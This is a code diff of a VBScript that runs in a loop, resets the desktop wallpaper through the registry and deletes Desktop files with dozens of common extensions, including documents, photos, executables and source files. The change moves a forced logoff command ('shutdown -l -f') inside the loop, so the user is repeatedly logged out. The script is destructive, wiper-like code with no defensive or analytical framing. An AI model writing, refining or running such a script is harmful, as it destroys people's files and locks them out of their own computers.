@@ -59,8 +59,8 @@ Do
     objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
     objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
     
-    ' Loop through each file in the Desktop folder and delete if it has a specified file extension
-For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
+       ' Loop through each file in the Desktop folder and delete if it has a specified file extension
+    For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
         Dim extension
         extension = LCase(objFSO.GetExtensionName(objFile.Name))
         If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "doc" Or extension = "pdf" Or extension = "wpd" Or extension = "docx" Or extension = "rtf" Or extension = "tex" Or extension = "odt" Or extension = "jpg" Or extension = "jpeg" Or extension = "mp3" Or extension = "rar" Or extension = "vcd" Or extension = "webp" Or extension = "css" Or extension = "html" Or extension = "py" Or extension = "php" Or extension = "ico" Or extension = "lnk" Or extension = "mp4" Or extension = "js" Or extension = "bak" Or extension = "xml" Or extension = "zip" Or extension = "bmp" Then
@@ -85,11 +85,11 @@ For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
         Next
         On Error GoTo 0 ' Reset error handling
     Next
-
+    
+    ' Log out the current user
+    objShell.Run "shutdown -l -f", 0, True
+    
 Loop
-
-' Log out the current user
-objShell.Run "shutdown -l -f", 0, True
 
 Sub DeleteFilesExceptVBS(folderPath)
     On Error Resume Next
